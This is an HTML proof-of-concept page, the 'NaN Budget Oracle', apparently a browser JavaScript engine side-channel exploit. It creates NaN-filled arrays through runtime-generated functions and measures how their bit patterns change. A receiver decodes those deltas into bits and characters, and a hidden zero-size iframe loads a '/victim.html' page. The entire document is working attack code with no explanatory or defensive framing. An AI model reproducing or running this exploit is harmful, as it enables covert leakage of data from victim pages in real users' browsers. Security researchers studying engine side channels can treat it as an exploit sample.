<!doctype html>
<meta charset="utf-8">
<title>NaN Budget Oracle – FINAL PoC</title>

<h2>NaN Budget Oracle (Reliable Demo)</h2>
<pre id="log"></pre>

<!-- SAME ORIGIN IFRAME -->
<iframe src="/victim.html" style="width:0;height:0;border:0"></iframe>

<script>
// ===== CORE =====
const nan = new Float64Array(new Uint8Array(8).fill(0xff).buffer)[0];

function measure({ size = 120, bsize = 40, r = Math.random() } = {}) {
  const c = new Function('nan', `
    const arr = []
    for (let i = 0; i < ${size}; i++) arr[i] = [nan]
    const r = ${r}
    if (r < 0) { ${'p();'.repeat(bsize)} }
    return arr
  `);

  const arr = c(nan);
  let res = 0;

  for (let i = 0; i < arr.length; i++) {
    const u8 = new Uint8Array(new Float64Array(arr[i]).buffer);
    if (u8[0] !== 0xff) res = i;
  }
  return res;
}

function sampleDelta() {
  const r = Math.random();
  const a = measure({ r });
  const b = measure({ r });
  return b - a;
}

// ===== DECODER =====
function decodeSymbol(d) {
  if (d < 3) return '00';
  if (d < 7) return '01';
  if (d < 12) return '10';
  return '11';
}

// ===== LOG =====
function log(msg) {
  document.getElementById('log').textContent += msg + "\n";
  console.log(msg);
}

// ===== RECEIVER =====
let buffer = '';
let started = false;

function startReceiver() {
  if (started) return;
  started = true;

  log("[+] SIGNAL LOCKED — RECEIVING");

  setInterval(() => {
    const d = sampleDelta();
    const sym = decodeSymbol(d);

    buffer += sym;

    if (buffer.length >= 8) {
      const byte = buffer.slice(0, 8);
      buffer = buffer.slice(8);

      const char = String.fromCharCode(parseInt(byte, 2));
      log("BYTE " + byte + " -> " + char);
    }
  }, 100);
}

// ===== AUTO-DETECT SIGNAL =====
setInterval(() => {
  let hits = 0;

  for (let i = 0; i < 20; i++) {
    if (sampleDelta() > 3) hits++;
  }

  log("[dbg] signal hits: " + hits);

  if (hits > 5) {
    startReceiver();
  }
}, 1000);
</script>
